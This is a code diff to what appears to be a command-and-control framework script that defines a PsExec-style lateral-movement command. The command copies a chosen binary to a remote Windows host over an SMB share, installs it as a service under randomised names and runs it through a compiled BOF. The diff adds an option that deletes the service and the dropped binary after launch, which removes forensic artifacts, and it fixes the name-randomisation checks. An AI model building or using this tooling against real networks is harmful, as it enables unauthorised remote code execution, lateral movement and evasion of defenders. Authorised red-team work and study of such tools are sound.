@@ -9,6 +9,7 @@ _cmd_jump_psexec.addArgFlagString( "-s", "share",           "Share for for copyi
 _cmd_jump_psexec.addArgFlagString( "-p", "svc_path",        "Path to the service file", "C:\\Windows");
 _cmd_jump_psexec.addArgFlagString( "-n", "svc_name",        "Service name", "random");
 _cmd_jump_psexec.addArgFlagString( "-d", "svc_description", "Service description", "random");
+_cmd_jump_psexec.addArgFlagString( "-k", "cleanup",         "1 = stop+delete service and remote binary after start (kills the new session; delete artifacts when done). 0 = leave installed", "0");
 _cmd_jump_psexec.addArgString("target", true);
 _cmd_jump_psexec.addArgFile("binary", true);
 _cmd_jump_psexec.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
@@ -19,12 +20,13 @@ _cmd_jump_psexec.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines)
     let svc_path        = parsed_json["svc_path"];
     let svc_name        = parsed_json["svc_name"];
     let svc_description = parsed_json["svc_description"];
+    let cleanup         = parsed_json["cleanup"];
 
     if (binary_name == "random")  binary_name = ax.random_string(8, "alphabetic") + ".exe";
-    if (svc_name.length == "random")  svc_name = ax.random_string(10, "alphabetic");
-    if (svc_description.length == "random")  svc_description = ax.random_string(16, "alphabetic");
+    if (svc_name == "random")  svc_name = ax.random_string(10, "alphabetic");
+    if (svc_description == "random")  svc_description = ax.random_string(16, "alphabetic");
 
-    let bof_params = ax.bof_pack("cstr,bytes,cstr,cstr,cstr,cstr,cstr", [target, binary_content, binary_name, share, svc_path, svc_name, svc_description]);
+    let bof_params = ax.bof_pack("cstr,bytes,cstr,cstr,cstr,cstr,cstr,int", [target, binary_content, binary_name, share, svc_path, svc_name, svc_description, parseInt(cleanup)]);
     let bof_path = ax.script_dir() + "_bin/psexec." + ax.arch(id) + ".o";
     let message = `Task: Jump to ${target} via PsExec (${binary_name})`;
 
